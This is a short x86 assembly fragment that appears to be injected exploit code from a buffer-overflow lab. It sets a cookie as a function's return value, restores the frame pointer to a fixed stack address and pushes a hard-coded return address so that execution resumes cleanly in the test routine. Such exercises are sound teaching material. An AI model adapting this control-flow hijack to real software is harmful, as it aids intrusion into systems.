mov 0x804c1e4,%eax		# set cookie as the return value
mov $0x55683b00,%ebp		# restore the ebp for test
push $0x08048dc1		# push the return location
ret				# return to the test
